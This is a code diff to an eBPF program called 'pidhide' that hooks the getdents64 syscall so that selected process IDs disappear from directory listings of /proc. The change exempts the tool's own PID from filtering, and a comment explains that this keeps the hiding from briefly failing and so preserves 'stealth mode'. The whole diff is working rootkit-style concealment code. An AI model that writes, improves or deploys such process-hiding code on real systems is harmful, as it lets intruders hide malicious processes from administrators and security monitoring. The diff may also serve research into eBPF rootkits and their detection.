@@ -51,6 +51,12 @@ struct {
 // Optional Target Parent PID
 const volatile int target_ppid = 0;
 
+// pidhide's own PID - exempt it from filtering so its /proc rescans
+// can see the PIDs it's hiding (otherwise the rescan sees them as gone,
+// removes them from the map, making them briefly visible again, then
+// re-adds them - a 2-second oscillation that defeats stealth mode).
+const volatile int self_pid = 0;
+
 #define MAX_PID_LEN 10
 
 // PIDs to hide, keyed by their fixed-size, zero-padded string form (the
@@ -86,7 +92,11 @@ SEC("tp/syscalls/sys_enter_getdents64")
 int handle_getdents_enter(struct trace_event_raw_sys_enter *ctx)
 {
     size_t pid_tgid = bpf_get_current_pid_tgid();
-    
+    int cur_pid = (int)(pid_tgid >> 32);
+
+    if (self_pid != 0 && cur_pid == self_pid)
+        return 0;
+
     // Check if we're a process thread of interest
     // if target_ppid is 0 then we target all pids
     if (target_ppid != 0) {
@@ -112,6 +122,11 @@ SEC("tp/syscalls/sys_exit_getdents64")
 int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
 {
     size_t pid_tgid = bpf_get_current_pid_tgid();
+    int cur_pid = (int)(pid_tgid >> 32);
+
+    if (self_pid != 0 && cur_pid == self_pid)
+        return 0;
+
     int total_bytes_read = ctx->ret;
     
     // if bytes_read is 0, everything's been read
